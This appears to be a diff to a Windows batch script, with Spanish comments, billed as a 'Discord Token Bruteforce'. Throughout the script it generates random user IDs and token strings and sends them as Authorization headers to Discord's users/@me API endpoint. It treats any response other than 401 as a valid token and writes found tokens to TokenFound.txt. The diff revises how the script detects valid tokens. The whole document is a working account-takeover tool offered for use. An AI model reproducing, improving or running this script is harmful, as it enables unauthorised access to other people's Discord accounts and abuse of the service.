@@ -1,4 +1,5 @@
 @echo off
+cls
 :: Ingreso enabledelayedexpansion por el generador de lineas y enableextensions para evitar algun
 :: Inconveniente con if o set
 setlocal enableextensions enabledelayedexpansion
@@ -10,8 +11,8 @@ if not exist winhttpjs.bat (
 )
 cls
 :main
+set "function=winhttpjs.bat https://discordapp.com/api/v6/users/@me -method GET -headers-file head.txt -force yes"
 ::(
-set value=0
 mode con cols=120 lines=40
 title Discord Token Bruteforce, hecho por NK125
 echo Discord Token Bruteforce-Port en Batch por NK125 #ZedSquad
@@ -50,7 +51,7 @@ if %errorlevel%==1 (
     echo.
     set /p ID="Ingresa la ID del usuario:"
     echo Iniciando.
-    goto ID
+    goto IDcheck
 )
 ::)
 :: Funcion de ID Random
@@ -58,10 +59,10 @@ if %errorlevel%==1 (
 :brute
 call :gennum 18
 set ID=!rannum!
-call :ID
+call :IDcheck
 goto brute
 :: Funcion de ID Proporcionada
-:ID
+:IDcheck
 :: Elimina la variable token
 set token=
 echo %ID%>id.txt
@@ -85,12 +86,8 @@ set token=!idf!!string!
 echo Authorization:%token%>head.txt
 echo Content-Type:application/json>>head.txt
 :: Errorlevel es igual a 2 para evitar un cambio no autorizado del valor por un comando externo, exit /b,
-:: Puede alterar el valor errorlevel y con eso me base (junto a winhttpjs) para detectar los tokens
-:: Si ves que la consola dice "Status: 200 OK" pero el script lo marca como invalido contactame para arreglar el script
-:: Puesto que ese Status indica que el token es valido, para tu conveniencia, copia e intenta usar los 2 tokens que te
-:: Estan debajo de Status: 200 ya que estos son validos.
-call :detect
-IF %ERRORLEVEL%==2 (
+call %function% | findstr /I /C:"Status: 401"
+IF %ERRORLEVEL%==1 (
     echo Valido^! Token="%token%"
     echo Bat-Py Port Script por NK125
     echo Puedes encontrar el token en %cd%\TokenFound.txt
@@ -101,7 +98,6 @@ IF %ERRORLEVEL%==2 (
 ) else (
     echo Invalido: %token%
 )
-if %gennum%==1 goto :EOF
 goto funcmain
 :: Funcion generar lineas
 :genlinea
@@ -126,6 +122,3 @@ set ran=%random%
 set rannum=!rannum!%ran:~0,1%
 if not %coun%==%length% goto loop
 exit /b
-:detect
-"winhttpjs.bat" https://discordapp.com/api/v6/users/@me -method GET -headers-file head.txt | findstr /I /C:"200 OK" && exit /b 2
-exit /b 1
